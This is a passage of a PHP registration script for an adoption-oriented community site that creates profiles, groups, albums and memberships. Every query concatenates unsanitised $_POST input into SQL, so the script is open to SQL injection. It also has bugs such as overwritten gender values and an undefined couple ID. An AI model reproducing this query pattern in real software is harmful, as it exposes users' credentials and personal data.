<?php
/***********************************************************************************************

*     Name                :  Prashanth A
*     Date                :  Mon Nov 5 2013
*     Purpose             :  Inserting values to the database  and assiging membership to users.

************************************************************************************************/
require_once ('../../inc/header.inc.php');

require_once ('../../inc/profiles.inc.php');

require_once ('../../inc/utils.inc.php');

require_once ('../../inc/db.inc.php');

// Getting the post values

$EmailID = $_POST['emailid'];
$UserName = $_POST['usern'];
$Password = $_POST['passw'];
$CoupleLName = $_POST['couplelname'];
$CoupleFName = $_POST['couplfname'];
$CPassword = $_POST['cpassw'];
$CPassword = $_POST['cpassw'];
$FirstName = $_POST['firstname'];
$LastFName = $_POST['lastname'];
$Agency = $_POST['useragency'];
$Region = $_POST['userregion'];
$State = $_POST['userstate'];
$CurrentDate = date('Y-m-d H:i:s');
$Profiletype = $_POST['Profiletype'];
$Gender = $_POST['genderfemale'];
$Gender = $_POST['gendermale'];
$Cgender = $_POST['cgenederfemale'];
$Cgender = $_POST['cgenedermale'];
$pstatus = $_POST['ptypec'];
$cpstatus = $_POST['ptypes'];
$mem_type = $_POST['mtype'];
$agency_title = $_POST['newagency'];
$agency_uri = $string = preg_replace('/\s+/', '', $_POST['newagency']);
// Password encryption

$sSalt = genRndSalt();
$passen = encryptUserPwd($Password, $sSalt);

// Checking Email and Username uniqueness

$tablename = 'Profiles';
$columns = 'Email';
$stringSQL_Email = "SELECT  " . $columns . " FROM " . $tablename . " where Email = '" . $EmailID . "' ";
$query_email = mysql_query($stringSQL_Email);

if (mysql_num_rows($query_email) > 0)
{
$email_error = 'The email is already in use please try another email.';
$cmdtuples = 1;
}
  else
{
}

$tablename = 'bx_groups_main';
$columns = 'title';
$stringSQL_title = "SELECT  " . $columns . " FROM " . $tablename . " where title = '" . $agency_title . "' ";
$query_title = mysql_query($stringSQL_title);

if (mysql_num_rows($query_title) > 0)
{
$agency_error = 'The agency name is already in use please try another agency name .';
$cmdtuples = 1;
}
  else
{
}



$tablename = 'Profiles';
$columns = 'NickName';
$stringSQL_Username = "SELECT  " . $columns . " FROM " . $tablename . " where NickName = '" . $UserName . "' ";
$query_username = mysql_query($stringSQL_Username);

if (mysql_num_rows($query_username) > 0)
{ // already in use?
$username_error = 'The user name is already in use please try another user name.';
$cmdtuples = 1;
}
  else
{
}

// Inserting values to profile table

if ($username_error != '' || $email_error != '' || $agency_error != '')
{
}
  else
{
if ($pstatus == "single" )
{
if ($Profiletype != 8 )
{
    
 $stringSQL_Profile = "INSERT INTO `Profiles` SET `NickName` = '" . $UserName . "', `Password` = '" . $passen . "',`Salt` = '" . $sSalt . "',`Email` = '" . $EmailID . "', `DateReg` = '" . $CurrentDate . "', 
`DateLastEdit` = '0000-00-00', `Status` = 'Active', `DateLastLogin` = '" . $CurrentDate . "', `Featured` = 0, `Sex` = '" . $Gender . "', `LookingFor` = '', 
`DescriptionMe` = '', `DateOfBirth` = '', `Headline` = '', `Country` = 'US', `City` = '', `Couple` = 0, `Tags` = '', `zip` = '', 
`EmailNotify` = 1, `Height` = '', `Weight` = '', `Income` = '', `Occupation` = '', `Religion` = '', `Education` = '', `RelationshipStatus` = '', 
`Hobbies` = '', `Interests` = '', `Ethnicity` = '', `FavoriteSites` = '', `FavoriteMusic` = '', `FavoriteFilms` = '', `FavoriteBooks` = '', 
`FirstName` = '" . $FirstName . "', `LastName` = '" . $LastFName . "', `ProfileType` = '" . $Profiletype . "', `AdoptionAgency` = '" . $Agency . "', `PromoCode` = '', `Region` = '" . $Region . "',
`ChildAge` = '', `FamilyStructure` = '', `FavoriteMarkStuff` = '', `ChildSpecialNeeds` = '', `ChildGender` = '', `ChildEthnicity` = '', 
`Pet` = '', `Neighborhood` = '', `Residency` = '', `State` = '" . $State . "', `Facebook` = '', `Twitter` = '', `MySpace` = '', `Smoking` = '', 
`DueDate` = '', `BMPhone` = '', `BMTimetoReach` = '', `BMChildEthnicity` = '', `BMChildDOB` = '', `BMAddress` = '', `YearsMarried` = '', 
`BMChildSex` = '', `DearBirthParent` = '', `WEB_URL` = '', `CLICK_TO_CALL` = '0', `CONTACT_NUMBER` = '0', `Fax_Number` = '', `Street_Address` = '', 
`About_our_home` = '', `Save_Option` = '', `SpecialNeedsOptions` = '', `ChildDesired` = '', `BirthFatherStatus` = '', `DrugsAlcohol` = '', 
`SmokingDuringPregnancy` = 'None', `BPFamilyHistory` = '', `Openness` = '', `Adoptiontype` = '', `Specialneeds` = '', `SpecialneedsOptionss` = '', 
`Drinking` = 'None', `Druguse` = '', `noofchildren` = '', `Conception` = '', `Familyhistory` = '', `BPDrinking` = '', `bprelationtype` = '', 
`bphousetype` = '', `bpreason` = '', `bpstayathome` = '', `bpethnicity` = '', 
`bplocation` = '', `bpreligion` = '', `bppets` = '', `bpdegree` = '', `bpage` = '', `bpadoption` = '', `bpstructure` = '', `Stayathome` = 'Yes', `Reason` = '';";
$stringSQL_Profile_draft = "INSERT INTO `Profiles_draft` SET `NickName` = '" . $UserName . "', `Password` = '" . $passen . "',`Salt` = '" . $sSalt . "',`Email` = '" . $EmailID . "', `DateReg` = '" . $CurrentDate . "', 
`DateLastEdit` = '0000-00-00', `Status` = 'Active', `DateLastLogin` = '" . $CurrentDate . "', `Featured` = 0, `Sex` = '" . $Gender . "', `LookingFor` = '', 
`DescriptionMe` = '', `DateOfBirth` = '', `Headline` = '', `Country` = 'US', `City` = '', `Couple` = 0, `Tags` = '', `zip` = '', 
`EmailNotify` = 1, `Height` = '', `Weight` = '', `Income` = '', `Occupation` = '', `Religion` = '', `Education` = '', `RelationshipStatus` = '', 
`Hobbies` = '', `Interests` = '', `Ethnicity` = '', `FavoriteSites` = '', `FavoriteMusic` = '', `FavoriteFilms` = '', `FavoriteBooks` = '', 
`FirstName` = '" . $FirstName . "', `LastName` = '" . $LastFName . "', `ProfileType` = '" . $Profiletype . "', `AdoptionAgency` = '" . $Agency . "', `PromoCode` = '', `Region` = '" . $Region . "',
`ChildAge` = '', `FamilyStructure` = '', `FavoriteMarkStuff` = '', `ChildSpecialNeeds` = '', `ChildGender` = '', `ChildEthnicity` = '', 
`Pet` = '', `Neighborhood` = '', `Residency` = '', `State` = '" . $State . "', `Facebook` = '', `Twitter` = '', `MySpace` = '', `Smoking` = '', 
`DueDate` = '', `BMPhone` = '', `BMTimetoReach` = '', `BMChildEthnicity` = '', `BMChildDOB` = '', `BMAddress` = '', `YearsMarried` = '', 
`BMChildSex` = '', `DearBirthParent` = '', `WEB_URL` = '', `CLICK_TO_CALL` = '0', `CONTACT_NUMBER` = '0', `Fax_Number` = '', `Street_Address` = '', 
`About_our_home` = '', `Save_Option` = '', `SpecialNeedsOptions` = '', `ChildDesired` = '', `BirthFatherStatus` = '', `DrugsAlcohol` = '', 
`SmokingDuringPregnancy` = 'None', `BPFamilyHistory` = '', `Openness` = '', `Adoptiontype` = '', `Specialneeds` = '', `SpecialneedsOptionss` = '', 
`Drinking` = 'None', `Druguse` = '', `noofchildren` = '', `Conception` = '', `Familyhistory` = '', `BPDrinking` = '', `bprelationtype` = '', 
`bphousetype` = '', `bpreason` = '', `bpstayathome` = '', `bpethnicity` = '', 
`bplocation` = '', `bpreligion` = '', `bppets` = '', `bpdegree` = '', `bpage` = '', `bpadoption` = '', `bpstructure` = '', `Stayathome` = 'Yes', `Reason` = '';";
mysql_query($stringSQL_Profile);
mysql_query($stringSQL_Profile_draft);
$iNewID = db_last_id();
$group = "INSERT INTO `bx_groups_fans` SET `id_entry` = '" . $Agency . "', `id_profile` = '" . $iNewID . "' , `when` = '1372952822', `confirmed` = '1'";
mysql_query($group);


$albumname_user = $UserName."'".'s photos';
$albumname_user_uri = $UserName.'-s-photos';
$created_date = time();
$albumname_user_to = addslashes($albumname_user); 


mysql_query("INSERT INTO `sys_albums` 
(`Caption`, `Uri`, `Location`, `Description`, `Type`, `Owner`, `Status`, `Date`, `ObjCount`, `LastObjId`, `AllowAlbumView`) 
VALUES ('$albumname_user_to', '$albumname_user_uri', 'Undefined', '', 'bx_photos', '$iNewID', 'active', $created_date, '0', '0', '3')");




$albumname_user_video = $UserName."'".'s videos';
$albumname_user_video_uri = $UserName.'-s-videos';
$created_date = time();
$albumname_user_video_to = addslashes($albumname_user_video); 

mysql_query("INSERT INTO `sys_albums` 
(`Caption`, `Uri`, `Location`, `Description`, `Type`, `Owner`, `Status`, `Date`, `ObjCount`, `LastObjId`, `AllowAlbumView`) 
VALUES ('$albumname_user_video_to', '$albumname_user_video_uri', 'Undefined', '', 'bx_videos', '$iNewID', 'active', $created_date, '0', '0', '3')");


$albumname_home = 'Home pictures';
$albumname_home_uri = 'Profile pictures';
$created_date = time();
$albumname_home_to = addslashes($albumname_home); 


mysql_query("INSERT INTO `sys_albums` 
(`Caption`, `Uri`, `Location`, `Description`, `Type`, `Owner`, `Status`, `Date`, `ObjCount`, `LastObjId`, `AllowAlbumView`) 
VALUES ('$albumname_home_to', '$albumname_home_uri', 'Undefined', '', 'bx_photos', '$iNewID', 'active', $created_date, '0', '0', '3')");

 

/* create video album*/
$albumname_home = $UserName."'".'s home videos';
$albumname_home_uri = $UserName.'-s-home-videos';
$created_date = time();
$albumname_home_to = addslashes($albumname_home); 

mysql_query("INSERT INTO `sys_albums` 
(`Caption`, `Uri`, `Location`, `Description`, `Type`, `Owner`, `Status`, `Date`, `ObjCount`, `LastObjId`, `AllowAlbumView`) 
VALUES ('$albumname_home_to', '$albumname_home_uri', 'Undefined', '', 'bx_videos', '$iNewID', 'active', $created_date, '0', '0', '3')");



}
else 

{
    
  $curdate = time();
  $group_query = "INSERT INTO `bx_groups_main` SET `title` = '$agency_title',`uri` = '$agency_uri',bx_groups_main.desc='',`country` = '',
  `city` = '',`zip` = '',`status` = 'pending',`thumb` = '',`created` = '$curdate',`author_id` = '',`tags` = '',    
  `categories` = '',views= '',rate= '',rate_count= '',comments_count= '',fans_count= '',featured= '',`allow_view_group_to` = '3',    
  `allow_view_fans_to` = '3', `allow_comment_to` = 'f', `allow_rate_to` = 'f', `allow_post_in_forum_to` = 'f', 
  `allow_join_to` = '3', `join_confirmation` = '1', `allow_upload_photos_to` = 'a', `allow_upload_videos_to` = 'a', 
  `allow_upload_sounds_to` = 'a', `allow_upload_files_to` = 'a'";
   mysql_query($group_query);  
   $group_id = mysql_insert_id();
   
 //  $sqlQuery = "INSERT INTO `sys_pre_values` (`Key`, `Value`, `Order`, `LKey`) VALUES('AdoptionAgency', '$group_id', '$group_id', '__$agency_title')";
 //  mysql_query($sqlQuery);
   
 //  $sqlQuery_keys = "INSERT INTO `sys_localization_keys` (`IDCategory`, `Key`) VALUES('1','__$agency_title')";
 //  mysql_query($sqlQuery_keys);
 //  $lang_id = db_last_id();
   
 //  $sqlQuery_strings = "INSERT INTO `sys_localization_strings` (`IDKey`, `IDLanguage`, `String`) VALUES('$lang_id', '1','$agency_title')";
 //  mysql_query($sqlQuery_strings);
   
  
$stringSQL_Profile = "INSERT INTO `Profiles` SET `NickName` = '" . $UserName . "', `Password` = '" . $passen . "',`Salt` = '" . $sSalt . "',`Email` = '" . $EmailID . "', `DateReg` = '" . $CurrentDate . "', 
  `DateLastEdit` = '0000-00-00', `Status` = 'Approval', `DateLastLogin` = '" . $CurrentDate . "', `Featured` = 0, `Sex` = '" . $Gender . "', `LookingFor` = '', 
  `DescriptionMe` = '', `DateOfBirth` = '', `Headline` = '', `Country` = 'US', `City` = '', `Couple` = 0, `Tags` = '', `zip` = '', 
  `EmailNotify` = 1, `Height` = '', `Weight` = '', `Income` = '', `Occupation` = '', `Religion` = '', `Education` = '', `RelationshipStatus` = '', 
  `Hobbies` = '', `Interests` = '', `Ethnicity` = '', `FavoriteSites` = '', `FavoriteMusic` = '', `FavoriteFilms` = '', `FavoriteBooks` = '', 
`FirstName` = '" . $FirstName . "', `LastName` = '" . $LastFName . "', `ProfileType` = '" . $Profiletype . "', `AdoptionAgency` = '" . $group_id . "', `PromoCode` = '', `Region` = '" . $Region . "',
`ChildAge` = '', `FamilyStructure` = '', `FavoriteMarkStuff` = '', `ChildSpecialNeeds` = '', `ChildGender` = '', `ChildEthnicity` = '', 
`Pet` = '', `Neighborhood` = '', `Residency` = '', `State` = '" . $State . "', `Facebook` = '', `Twitter` = '', `MySpace` = '', `Smoking` = '', 
`DueDate` = '', `BMPhone` = '', `BMTimetoReach` = '', `BMChildEthnicity` = '', `BMChildDOB` = '', `BMAddress` = '', `YearsMarried` = '', 
`BMChildSex` = '', `DearBirthParent` = '', `WEB_URL` = '', `CLICK_TO_CALL` = '0', `CONTACT_NUMBER` = '0', `Fax_Number` = '', `Street_Address` = '', 
`About_our_home` = '', `Save_Option` = '', `SpecialNeedsOptions` = '', `ChildDesired` = '', `BirthFatherStatus` = '', `DrugsAlcohol` = '', 
`SmokingDuringPregnancy` = 'None', `BPFamilyHistory` = '', `Openness` = '', `Adoptiontype` = '', `Specialneeds` = '', `SpecialneedsOptionss` = '', 
`Drinking` = 'None', `Druguse` = '', `noofchildren` = '', `Conception` = '', `Familyhistory` = '', `BPDrinking` = '', `bprelationtype` = '', 
`bphousetype` = '', `bpreason` = '', `bpstayathome` = '', `bpethnicity` = '', 
`bplocation` = '', `bpreligion` = '', `bppets` = '', `bpdegree` = '', `bpage` = '', `bpadoption` = '', `bpstructure` = '', `Stayathome` = 'Yes', `Reason` = '';";
mysql_query($stringSQL_Profile);
$stringSQL_Profile_draft = "INSERT INTO `Profiles_draft` SET `NickName` = '" . $UserName . "', `Password` = '" . $passen . "',`Salt` = '" . $sSalt . "',`Email` = '" . $EmailID . "', `DateReg` = '" . $CurrentDate . "', 
`DateLastEdit` = '0000-00-00', `Status` = 'Approval', `DateLastLogin` = '" . $CurrentDate . "', `Featured` = 0, `Sex` = '" . $Gender . "', `LookingFor` = '', 
`DescriptionMe` = '', `DateOfBirth` = '', `Headline` = '', `Country` = 'US', `City` = '', `Couple` = 0, `Tags` = '', `zip` = '', 
`EmailNotify` = 1, `Height` = '', `Weight` = '', `Income` = '', `Occupation` = '', `Religion` = '', `Education` = '', `RelationshipStatus` = '', 
`Hobbies` = '', `Interests` = '', `Ethnicity` = '', `FavoriteSites` = '', `FavoriteMusic` = '', `FavoriteFilms` = '', `FavoriteBooks` = '', 
`FirstName` = '" . $FirstName . "', `LastName` = '" . $LastFName . "', `ProfileType` = '" . $Profiletype . "', `AdoptionAgency` = '" . $group_id . "', `PromoCode` = '', `Region` = '" . $Region . "',
`ChildAge` = '', `FamilyStructure` = '', `FavoriteMarkStuff` = '', `ChildSpecialNeeds` = '', `ChildGender` = '', `ChildEthnicity` = '', 
`Pet` = '', `Neighborhood` = '', `Residency` = '', `State` = '" . $State . "', `Facebook` = '', `Twitter` = '', `MySpace` = '', `Smoking` = '', 
`DueDate` = '', `BMPhone` = '', `BMTimetoReach` = '', `BMChildEthnicity` = '', `BMChildDOB` = '', `BMAddress` = '', `YearsMarried` = '', 
`BMChildSex` = '', `DearBirthParent` = '', `WEB_URL` = '', `CLICK_TO_CALL` = '0', `CONTACT_NUMBER` = '0', `Fax_Number` = '', `Street_Address` = '', 
`About_our_home` = '', `Save_Option` = '', `SpecialNeedsOptions` = '', `ChildDesired` = '', `BirthFatherStatus` = '', `DrugsAlcohol` = '', 
`SmokingDuringPregnancy` = 'None', `BPFamilyHistory` = '', `Openness` = '', `Adoptiontype` = '', `Specialneeds` = '', `SpecialneedsOptionss` = '', 
`Drinking` = 'None', `Druguse` = '', `noofchildren` = '', `Conception` = '', `Familyhistory` = '', `BPDrinking` = '', `bprelationtype` = '', 
`bphousetype` = '', `bpreason` = '', `bpstayathome` = '', `bpethnicity` = '', 
`bplocation` = '', `bpreligion` = '', `bppets` = '', `bpdegree` = '', `bpage` = '', `bpadoption` = '', `bpstructure` = '', `Stayathome` = 'Yes', `Reason` = '';";

mysql_query($stringSQL_Profile_draft);

$AUTHORID = mysql_insert_id();
$todaysdate = time();
$group_query = "INSERT INTO `bx_groups_fans` SET `id_entry` = '" . $group_id . "', `id_profile` = '" . $AUTHORID . "' , `when` = '$todaysdate', `confirmed` = '1'";
mysql_query($group_query);
 
 $authorid_query = "Update bx_groups_main SET `author_id` = '$AUTHORID' where ID = '$group_id'"; 
 mysql_query($authorid_query);
 
 
$group = "INSERT INTO `bx_groups_fans` SET `id_entry` = '" . $Agency . "', `id_profile` = '" . $iNewID . "' , `when` = '1372952822', `confirmed` = '1'";
mysql_query($group);


$albumname_user = $UserName."'".'s photos';
$albumname_user_uri = $UserName.'-s-photos';
$created_date = time();
$albumname_user_to = addslashes($albumname_user); 


mysql_query("INSERT INTO `sys_albums` 
(`Caption`, `Uri`, `Location`, `Description`, `Type`, `Owner`, `Status`, `Date`, `ObjCount`, `LastObjId`, `AllowAlbumView`) 
VALUES ('$albumname_user_to', '$albumname_user_uri', 'Undefined', '', 'bx_photos', '$AUTHORID', 'active', $created_date, '0', '0', '3')");




$albumname_user_video = $UserName."'".'s videos';
$albumname_user_video_uri = $UserName.'-s-videos';
$created_date = time();
$albumname_user_video_to = addslashes($albumname_user_video); 

mysql_query("INSERT INTO `sys_albums` 
(`Caption`, `Uri`, `Location`, `Description`, `Type`, `Owner`, `Status`, `Date`, `ObjCount`, `LastObjId`, `AllowAlbumView`) 
VALUES ('$albumname_user_video_to', '$albumname_user_video_uri', 'Undefined', '', 'bx_videos', '$AUTHORID', 'active', $created_date, '0', '0', '3')");
 
}

//$albumname = $UserName.'s photos';
//$albumname_uri = $UserName.'-s-photos';
//$created_date = time();
//
//Usere photos and videos album creation 

/*$albumname_home = $UserName."'".'s photos';
$albumname_home_uri = $UserName.'-s-photos';
$created_date = time();
$albumname_home_to = addslashes($albumname_home); 


mysql_query("INSERT INTO `sys_albums` 
(`Caption`, `Uri`, `Location`, `Description`, `Type`, `Owner`, `Status`, `Date`, `ObjCount`, `LastObjId`, `AllowAlbumView`) 
VALUES ('$albumname_home_to', '$albumname_home_uri', 'Undefined', '', 'bx_photos', '$iNewID', 'active', $created_date, '0', '0', '3')");




$albumname_home = $UserName."'".'s videos';
$albumname_home_uri = $UserName.'-s-videos';
$created_date = time();
$albumname_home_to = addslashes($albumname_home); 

mysql_query("INSERT INTO `sys_albums` 
(`Caption`, `Uri`, `Location`, `Description`, `Type`, `Owner`, `Status`, `Date`, `ObjCount`, `LastObjId`, `AllowAlbumView`) 
VALUES ('$albumname_home_to', '$albumname_home_uri', 'Undefined', '', 'bx_videos', '$iNewID', 'active', $created_date, '0', '0', '3')");
*/

//Home photos and videos album creation 


//  createProfileCache( $iNewID );

if (mysql_affected_rows() > 0)
{
$user_redirect = userlogin($UserName, $Password);
if ($Profiletype == 2)
{
setMembership($iNewID, $mem_type, $iDays = 0, $bStartsNow = false, $sTransactionId = '', $isSendMail = false);
$cmdtuples = 1;
}
elseif ($Profiletype == 4)
{
$mem_type = 6;
setMembership($iNewID, $mem_type, $iDays = 0, $bStartsNow = false, $sTransactionId = '', $isSendMail = false);
$cmdtuples = 1;
}
elseif ($Profiletype == 8)
{
$mem_type = 7;
setMembership($iNewID, $mem_type, $iDays = 0, $bStartsNow = false, $sTransactionId = '', $isSendMail = false);
$cmdtuples = 1;
}
}
  else
{
$user_redirect = $site['url'] . "join.php";
}
}
  else
{
$stringSQL_Profile_couplefirst = "INSERT INTO `Profiles` SET `NickName` = '" . $UserName . "', `Password` = '" . $passen . "',`Salt` = '" . $sSalt . "',`Email` = '" . $EmailID . "', `DateReg` = '" . $CurrentDate . "', 
`DateLastEdit` = '0000-00-00', `Status` = 'Active', `DateLastLogin` = '" . $CurrentDate . "', `Featured` = 0, `Sex` = '" . $Gender . "', `LookingFor` = '', 
`DescriptionMe` = '', `DateOfBirth` = '', `Headline` = '', `Country` = 'US', `City` = '', `Couple` = 0, `Tags` = '', `zip` = '', 
`EmailNotify` = 1, `Height` = '', `Weight` = '', `Income` = '', `Occupation` = '', `Religion` = '', `Education` = '', `RelationshipStatus` = '', 
`Hobbies` = '', `Interests` = '', `Ethnicity` = '', `FavoriteSites` = '', `FavoriteMusic` = '', `FavoriteFilms` = '', `FavoriteBooks` = '', 
`FirstName` = '" . $FirstName . "', `LastName` = '" . $LastFName . "', `ProfileType` = '" . $Profiletype . "', `AdoptionAgency` = '" . $Agency . "', `PromoCode` = '', `Region` = '" . $Region . "',
`ChildAge` = '', `FamilyStructure` = '', `FavoriteMarkStuff` = '', `ChildSpecialNeeds` = '', `ChildGender` = '', `ChildEthnicity` = '', 
`Pet` = '', `Neighborhood` = '', `Residency` = '', `State` = '" . $State . "', `Facebook` = '', `Twitter` = '', `MySpace` = '', `Smoking` = '', 
`DueDate` = '', `BMPhone` = '', `BMTimetoReach` = '', `BMChildEthnicity` = '', `BMChildDOB` = '', `BMAddress` = '', `YearsMarried` = '', 
`BMChildSex` = '', `DearBirthParent` = '', `WEB_URL` = '', `CLICK_TO_CALL` = '0', `CONTACT_NUMBER` = '0', `Fax_Number` = '', `Street_Address` = '', 
`About_our_home` = '', `Save_Option` = '', `SpecialNeedsOptions` = '', `ChildDesired` = '', `BirthFatherStatus` = '', `DrugsAlcohol` = '', 
`SmokingDuringPregnancy` = 'None', `BPFamilyHistory` = '', `Openness` = '', `Adoptiontype` = '', `Specialneeds` = '', `SpecialneedsOptionss` = '', 
`Drinking` = 'None', `Druguse` = '', `noofchildren` = '', `Conception` = '', `Familyhistory` = '', `BPDrinking` = '', `bprelationtype` = '', 
`bphousetype` = '', `bpreason` = '', `bpstayathome` = '', `bpethnicity` = '', 
`bplocation` = '', `bpreligion` = '', `bppets` = '', `bpdegree` = '', `bpage` = '', `bpadoption` = '', `bpstructure` = '', `Stayathome` = 'Yes', `Reason` = '';";
$stringSQL_Profile_couplesecond = "INSERT INTO `Profiles` SET `NickName` = '" . $UserName . "(2)" . "', `Password` = '" . $passen . "',`Salt` = '" . $sSalt . "',`Email` = '" . $EmailID . "(2)" . "', `DateReg` = '" . $CurrentDate . "', 
`DateLastEdit` = '0000-00-00', `Status` = 'Approval', `DateLastLogin` = '" . $CurrentDate . "', `Featured` = 0, `Sex` = '" . $Cgender . "', `LookingFor` = '', 
`DescriptionMe` = '', `DateOfBirth` = '', `Headline` = '', `Country` = 'US', `City` = '', `Couple` = '" . $CCoupleID . "', `Tags` = '', `zip` = '', 
`EmailNotify` = 1, `Height` = '', `Weight` = '', `Income` = '', `Occupation` = '', `Religion` = '', `Education` = '', `RelationshipStatus` = '', 
`Hobbies` = '', `Interests` = '', `Ethnicity` = '', `FavoriteSites` = '', `FavoriteMusic` = '', `FavoriteFilms` = '', `FavoriteBooks` = '', 
`FirstName` = '" . $CoupleFName . "', `LastName` = '" . $CoupleLName . "', `ProfileType` = '" . $Profiletype . "', `AdoptionAgency` = '" . $Agency . "', `PromoCode` = '', `Region` = '" . $Region . "',
`ChildAge` = '', `FamilyStructure` = '', `FavoriteMarkStuff` = '', `ChildSpecialNeeds` = '', `ChildGender` = '', `ChildEthnicity` = '', 
`Pet` = '', `Neighborhood` = '', `Residency` = '', `State` = '" . $State . "', `Facebook` = '', `Twitter` = '', `MySpace` = '', `Smoking` = '', 
`DueDate` = '', `BMPhone` = '', `BMTimetoReach` = '', `BMChildEthnicity` = '', `BMChildDOB` = '', `BMAddress` = '', `YearsMarried` = '', 
`BMChildSex` = '', `DearBirthParent` = '', `WEB_URL` = '', `CLICK_TO_CALL` = '0', `CONTACT_NUMBER` = '0', `Fax_Number` = '', `Street_Address` = '', 
`About_our_home` = '', `Save_Option` = '', `SpecialNeedsOptions` = '', `ChildDesired` = '', `BirthFatherStatus` = '', `DrugsAlcohol` = '', 
`SmokingDuringPregnancy` = 'None', `BPFamilyHistory` = '', `Openness` = '', `Adoptiontype` = '', `Specialneeds` = '', `SpecialneedsOptionss` = '', 
`Drinking` = 'None', `Druguse` = '', `noofchildren` = '', `Conception` = '', `Familyhistory` = '', `BPDrinking` = '', `bprelationtype` = '', 
`bphousetype` = '', `bpreason` = '', `bpstayathome` = '', `bpethnicity` = '', 
`bplocation` = '', `bpreligion` = '', `bppets` = '', `bpdegree` = '', `bpage` = '', `bpadoption` = '', `bpstructure` = '', `Stayathome` = 'Yes', `Reason` = '';";

$stringSQL_Profile_draft_couplefirst = "INSERT INTO `Profiles_draft` SET `NickName` = '" . $UserName . "', `Password` = '" . $passen . "',`Salt` = '" . $sSalt . "',`Email` = '" . $EmailID . "', `DateReg` = '" . $CurrentDate . "', 
`DateLastEdit` = '0000-00-00', `Status` = 'Active', `DateLastLogin` = '" . $CurrentDate . "', `Featured` = 0, `Sex` = '" . $Gender . "', `LookingFor` = '', 
`DescriptionMe` = '', `DateOfBirth` = '', `Headline` = '', `Country` = 'US', `City` = '', `Couple` = 0, `Tags` = '', `zip` = '', 
`EmailNotify` = 1, `Height` = '', `Weight` = '', `Income` = '', `Occupation` = '', `Religion` = '', `Education` = '', `RelationshipStatus` = '', 
`Hobbies` = '', `Interests` = '', `Ethnicity` = '', `FavoriteSites` = '', `FavoriteMusic` = '', `FavoriteFilms` = '', `FavoriteBooks` = '', 
`FirstName` = '" . $FirstName . "', `LastName` = '" . $LastFName . "', `ProfileType` = '" . $Profiletype . "', `AdoptionAgency` = '" . $Agency . "', `PromoCode` = '', `Region` = '" . $Region . "',
`ChildAge` = '', `FamilyStructure` = '', `FavoriteMarkStuff` = '', `ChildSpecialNeeds` = '', `ChildGender` = '', `ChildEthnicity` = '', 
`Pet` = '', `Neighborhood` = '', `Residency` = '', `State` = '" . $State . "', `Facebook` = '', `Twitter` = '', `MySpace` = '', `Smoking` = '', 
`DueDate` = '', `BMPhone` = '', `BMTimetoReach` = '', `BMChildEthnicity` = '', `BMChildDOB` = '', `BMAddress` = '', `YearsMarried` = '', 
`BMChildSex` = '', `DearBirthParent` = '', `WEB_URL` = '', `CLICK_TO_CALL` = '0', `CONTACT_NUMBER` = '0', `Fax_Number` = '', `Street_Address` = '', 
`About_our_home` = '', `Save_Option` = '', `SpecialNeedsOptions` = '', `ChildDesired` = '', `BirthFatherStatus` = '', `DrugsAlcohol` = '', 
`SmokingDuringPregnancy` = 'None', `BPFamilyHistory` = '', `Openness` = '', `Adoptiontype` = '', `Specialneeds` = '', `SpecialneedsOptionss` = '', 
`Drinking` = 'None', `Druguse` = '', `noofchildren` = '', `Conception` = '', `Familyhistory` = '', `BPDrinking` = '', `bprelationtype` = '', 
`bphousetype` = '', `bpreason` = '', `bpstayathome` = '', `bpethnicity` = '', 
`bplocation` = '', `bpreligion` = '', `bppets` = '', `bpdegree` = '', `bpage` = '', `bpadoption` = '', `bpstructure` = '', `Stayathome` = 'Yes', `Reason` = '';";
$stringSQL_Profile_draft_couplesecond = "INSERT INTO `Profiles_draft` SET `NickName` = '" . $UserName . "(2)" . "', `Password` = '" . $passen . "',`Salt` = '" . $sSalt . "',`Email` = '" . $EmailID . "(2)" . "', `DateReg` = '" . $CurrentDate . "', 
`DateLastEdit` = '0000-00-00', `Status` = 'Approval', `DateLastLogin` = '" . $CurrentDate . "', `Featured` = 0, `Sex` = '" . $Cgender . "', `LookingFor` = '', 
`DescriptionMe` = '', `DateOfBirth` = '', `Headline` = '', `Country` = 'US', `City` = '', `Couple` = '" . $CCoupleID . "', `Tags` = '', `zip` = '', 
`EmailNotify` = 1, `Height` = '', `Weight` = '', `Income` = '', `Occupation` = '', `Religion` = '', `Education` = '', `RelationshipStatus` = '', 
`Hobbies` = '', `Interests` = '', `Ethnicity` = '', `FavoriteSites` = '', `FavoriteMusic` = '', `FavoriteFilms` = '', `FavoriteBooks` = '', 
`FirstName` = '" . $CoupleFName . "', `LastName` = '" . $CoupleLName . "', `ProfileType` = '" . $Profiletype . "', `AdoptionAgency` = '" . $Agency . "', `PromoCode` = '', `Region` = '" . $Region . "',
`ChildAge` = '', `FamilyStructure` = '', `FavoriteMarkStuff` = '', `ChildSpecialNeeds` = '', `ChildGender` = '', `ChildEthnicity` = '', 
`Pet` = '', `Neighborhood` = '', `Residency` = '', `State` = '" . $State . "', `Facebook` = '', `Twitter` = '', `MySpace` = '', `Smoking` = '', 
`DueDate` = '', `BMPhone` = '', `BMTimetoReach` = '', `BMChildEthnicity` = '', `BMChildDOB` = '', `BMAddress` = '', `YearsMarried` = '', 
`BMChildSex` = '', `DearBirthParent` = '', `WEB_URL` = '', `CLICK_TO_CALL` = '0', `CONTACT_NUMBER` = '0', `Fax_Number` = '', `Street_Address` = '', 
`About_our_home` = '', `Save_Option` = '', `SpecialNeedsOptions` = '', `ChildDesired` = '', `BirthFatherStatus` = '', `DrugsAlcohol` = '', 
`SmokingDuringPregnancy` = 'None', `BPFamilyHistory` = '', `Openness` = '', `Adoptiontype` = '', `Specialneeds` = '', `SpecialneedsOptionss` = '', 
`Drinking` = 'None', `Druguse` = '', `noofchildren` = '', `Conception` = '', `Familyhistory` = '', `BPDrinking` = '', `bprelationtype` = '', 
`bphousetype` = '', `bpreason` = '', `bpstayathome` = '', `bpethnicity` = '', 
`bplocation` = '', `bpreligion` = '', `bppets` = '', `bpdegree` = '', `bpage` = '', `bpadoption` = '', `bpstructure` = '', `Stayathome` = 'Yes', `Reason` = '';";
mysql_query($stringSQL_Profile_couplefirst);
$iNewID = db_last_id();
mysql_query($stringSQL_Profile_couplesecond);
$iNewIDc = db_last_id();

// Inserting the values to user agency fans table

$group = "INSERT INTO `bx_groups_fans` SET `id_entry` = '" . $Agency . "', `id_profile` = '" . $iNewID . "', `when` = '1372952822', `confirmed` = '1'";
mysql_query($group);
mysql_query($stringSQL_Profile_draft_couplefirst);
mysql_query($stringSQL_Profile_draft_couplesecond);
mysql_query("Update `Profiles` SET Couple='$iNewIDc' where ID =" . $iNewID);
mysql_query("Update `Profiles` SET Couple='$iNewID' where ID =" . $iNewIDc);
